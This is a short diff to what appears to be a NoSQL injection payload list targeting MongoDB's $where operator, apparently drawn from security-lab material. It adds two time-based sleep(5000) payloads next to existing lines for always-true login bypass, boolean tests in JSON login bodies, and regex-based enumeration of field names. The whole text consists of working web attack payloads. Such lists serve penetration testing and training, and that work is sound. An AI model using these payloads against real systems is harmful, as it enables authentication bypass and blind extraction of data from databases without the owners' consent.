@@ -11,6 +11,8 @@ $where: '1 == 1'
 1, $where: '1 == 1'
 {"username":"wiener","password":"peter", "$where":"0"}
 {"username":"wiener","password":"peter", "$where":"1"}
+{"$where": "sleep(5000)"}
+"$where": "sleep(5000)"
 "$where":"Object.keys(this)[0].match('^.{0}a.*')"
 "$where": "Object.keys(this)[0].match(/^a.*/)"
 "$where": "Object.keys(this)[0].length == 1"
